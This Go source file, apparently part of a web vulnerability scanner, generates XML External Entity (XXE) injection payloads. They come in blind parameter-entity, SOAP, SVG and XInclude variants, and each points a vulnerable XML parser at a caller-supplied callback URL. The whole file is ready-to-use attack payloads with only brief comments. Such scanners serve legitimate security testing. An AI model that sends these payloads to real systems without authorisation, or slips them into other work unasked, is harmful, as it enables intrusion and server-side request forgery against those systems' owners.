/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package xxe

import "fmt"

// GetBlindXXEPayloads returns Blind XXE payloads using parameterized DTD injection
// These payloads use parameter entities (% xxe) which are required for Blind XXE
// because general entities cannot be used within DOCTYPE declarations
func GetBlindXXEPayloads(callbackURL string) []string {
	return []string{
		// Parameterized entity injection — basic
		fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "%s"> %%xxe; ]>`, callbackURL),
		// Parameterized entity injection with XML declaration
		fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "%s"> %%xxe; ]><root>&xxe;</root>`, callbackURL),
	}
}

// GetSOAPXXEPayloads returns XXE payloads in SOAP context
func GetSOAPXXEPayloads(callbackURL string) []string {
	return []string{
		// SOAP envelope with XXE entity injection
		fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>`, callbackURL),
		// SOAP with parameterized entity
		fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "%s"> %%xxe; ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>`, callbackURL),
	}
}

// GetSVGXXEPayloads returns XXE payloads in SVG context
func GetSVGXXEPayloads(callbackURL string) []string {
	return []string{
		// SVG file with XXE entity injection
		fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "%s">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`, callbackURL),
	}
}

// GetXIncludeXXEPayloads returns XInclude-based XXE payloads
// XInclude can be used when we cannot control the DOCTYPE declaration
func GetXIncludeXXEPayloads(callbackURL string) []string {
	return []string{
		// XInclude injection — does not require DOCTYPE
		fmt.Sprintf(`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="%s"/></foo>`, callbackURL),
	}
}
